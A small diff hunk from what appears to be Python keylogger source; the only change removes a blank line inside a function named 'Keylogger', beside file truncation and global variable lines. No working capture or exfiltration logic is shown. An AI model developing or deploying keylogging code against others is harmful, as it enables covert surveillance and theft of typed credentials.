@@ -11,7 +11,6 @@ file.truncate(0)
 file.close()
 Num = 0
 def Keylogger(key):
-
     global Num
     global firstiszero
     global firstiszero2
